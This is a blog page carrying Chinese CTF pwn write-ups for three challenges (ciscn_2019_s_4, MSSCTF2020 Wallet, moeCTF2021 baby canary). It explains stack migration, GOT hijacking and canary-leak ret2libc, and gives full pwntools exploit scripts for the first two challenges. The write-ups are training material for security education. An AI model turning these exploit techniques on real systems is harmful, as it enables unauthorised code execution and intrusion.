<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Static">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2024/01/23/一些pwn题的writeup/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="让你从0变成1 （斯哈">
<meta property="og:type" content="article">
<meta property="og:title" content="《从零开始的pwner生活》">
<meta property="og:url" content="http://example.com/2024/01/23/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9A%84writeup/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="让你从0变成1 （斯哈">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-01-23T07:53:13.482Z">
<meta property="article:modified_time" content="2023-04-26T06:47:13.731Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="CTFS">
<meta name="twitter:card" content="summary">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/cat-96.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/cat-96.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/cat-96.png">
    <!--- Page Info-->
    
    <title>
        
            《从零开始的pwner生活》 -
        
        Static&#39;s blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    
        <style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    
<script src="/js/libs/anime.min.js"></script>

    <h1 class="ml13">
        Static&#39;s blog
    </h1>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });


        anime.timeline({loop: true})
            .add({
                targets: '.ml13 .letter',
                translateY: [100,0],
                translateZ: 0,
                opacity: [0,1],
                easing: "easeOutExpo",
                duration: 1400,
                delay: (el, i) => 300 + 30 * i
            }).add({
            targets: '.ml13 .letter',
            translateY: [0,-100],
            opacity: [1,0],
            easing: "easeInExpo",
            duration: 1200,
            delay: (el, i) => 100 + 30 * i
        });

        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
        });

        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
        hidePreloaderAfterTimeout(5000);

        function hidePreloaderAfterTimeout(delay) {
            setTimeout(function () {
                var preloader = document.querySelector('.preloader');
                preloader.style.opacity = '0';
                setTimeout(function () {
                    preloader.style.display = 'none';
                }, 200);
            }, delay);
        }
    </script>
</div>
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/chuyin1.jpg","dark":"/images/JIJIAN.jpg"},"title":"Welcome here!","subtitle":{"text":["光阴有限同归老，风月无涯可慰颜。"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">

    <div class="navbar-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/cat-96.png">
                </a>
            
            <a class="logo-title" href="/">
                
                Static&#39;s blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">《从零开始的pwner生活》</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/OIP-C.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Static</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-01-23 15:53:13</span>
        <span class="mobile">2024-01-23 15:53:13</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2023-04-26 14:47:13</span>
            <span class="mobile">2023-04-26 14:47:13</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/CTFS/">CTFS</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/CTFS/">CTFS</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <p>题目均来自协会arttnba3师傅的帖子《从零开始的pwner生活》，由于本人水平有限，思路如有欠妥，欢迎指正。</p>
<h2 id="task01"><a href="#task01" class="headerlink" title="task01"></a>task01</h2><h3 id="0x01-ciscn-2019-s-4-ret2text-stack-migration"><a href="#0x01-ciscn-2019-s-4-ret2text-stack-migration" class="headerlink" title="0x01.ciscn_2019_s_4  (ret2text  + stack_migration)"></a>0x01.ciscn_2019_s_4  (ret2text  + stack_migration)</h3><p><code>checksec</code>发现只开了NX和partial relro</p>
<p>ida打开，看到vul函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而且有一个hack函数，不能得到flag，但是有<code>system</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>程序会<code>read</code>，<code>printf</code>先后两次</p>
<p>而每次读取都是<code>0x30</code>，最多只能溢出到返回地址。</p>
<p>这种情况一般要用到栈迁移。</p>
<p>那么很明显只要泄露出栈地址，然后利用<code>leave_ret</code>进行栈迁移就可以gets hell了。</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28888</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_s_4&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x804854B</span></span><br><span class="line">offset = <span class="number">0x28</span> + <span class="number">4</span></span><br><span class="line"><span class="comment">#泄露出栈地址，然后进行栈迁移</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome&#x27;</span>)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">4</span>))</span><br><span class="line">ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ebp:&quot;</span>+<span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line">sys = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x80484b8</span></span><br><span class="line">payload2 = p32(sys) + <span class="string">b&#x27;AAAA&#x27;</span> + p32(ebp-<span class="number">0x38</span>+<span class="number">0xc</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">0x14</span>-<span class="number">4</span>) + p32(ebp-<span class="number">0x38</span>-<span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x02-MSSCTF2020-Wallet-got-hijack"><a href="#0x02-MSSCTF2020-Wallet-got-hijack" class="headerlink" title="0x02.MSSCTF2020 - Wallet( got hijack )"></a>0x02.MSSCTF2020 - Wallet( got hijack )</h3><p>先<code>checksec</code>看到开了NX，partial relro和canary</p>
<p><code>main</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-10h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">2</span>]; <span class="comment">// [esp+0h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v6[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbufs();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wal1et prepares a big wallet for you, but clever man always has double passwords. So make your choice.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.JUST OPEN IT!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.EXIT&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v6, v4, v5);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    begin(p_argc);</span><br><span class="line">    check();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Here is something you like.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看到就是一个选择界面，主要在<code>begin</code>和<code>check</code>函数里面</p>
<p><code>begin</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">begin</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-8h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">108</span>]; <span class="comment">// [esp+0h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Show me your name : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%108s&quot;</span>, v3, v1, v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome %s! :P\n&quot;</span>, v3);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>输入name，不存在溢出</p>
<p><code>check</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-4h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-4h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now try the First password : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v5, v1, v3);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now try the Second password : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v6, v2, v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let me think......&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">338150</span> || v6 != <span class="number">13371337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You Failed! Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OMG!YOU SUCCESS!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>很明显让<code>v5==338150</code>并且<code>v6==13371337</code>就可以得到flag</p>
<p>但是<code>scanf</code>函数是对v5和v6所指向的地址进行写入</p>
<p>而不是改变v5和v6的值，在<code>check</code>函数中,我们并没有发现对v5和v6值的修改。</p>
<p>但是从ida中可以看到<code>call begin</code>之后直接就是<code>call check</code>，因此check函数里面的v5和v6可以由<code>begin</code>中的输入控制，仔细观察发现只能控制v5的值，v6值对应栈区域是<code>canary</code>的位置。那么就不能直接通过判断获得flag，但是我们可以控制v5的值为got表位置，从而利用<code>scanf</code>读入修改<code>scanf</code>的got表为<code>system(&quot;/bin/cat flag&quot;)</code>，下一次<code>call scanf</code>的时候就可以<code>cat flag</code>了</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./Wal1et&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改scanf  got表为system(&quot;/bin/cat flag&quot;)地址</span></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">104</span> + p32(<span class="number">0x804a02c</span>))</span><br><span class="line">io.sendline(<span class="string">b&#x27;134514480&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x03-moeCTF2021-baby-canary-canary-leak-ret2libc"><a href="#0x03-moeCTF2021-baby-canary-canary-leak-ret2libc" class="headerlink" title="0x03.moeCTF2021 - baby canary( canary leak + ret2libc )"></a>0x03.moeCTF2021 - baby canary( canary leak + ret2libc )</h3><p><code>checksec</code>看到开启了Full relro , NX , canary</p>
<p>ida打开</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So can you tell me who you are?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Wow.. %s is a good name...&quot;</span>, s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nSo what you come there for?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s good...But you need to escape from the canary before you get the flag!&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看到有两次输入，中间有一次输出</p>
<p>第一次输入覆盖<code>canary</code>的<code>\x00</code>位置，在打印时可打印出<code>canary</code>，第二次输入还原<code>canary</code>然后ret2libc即可</p>
<p>exp为:</p>
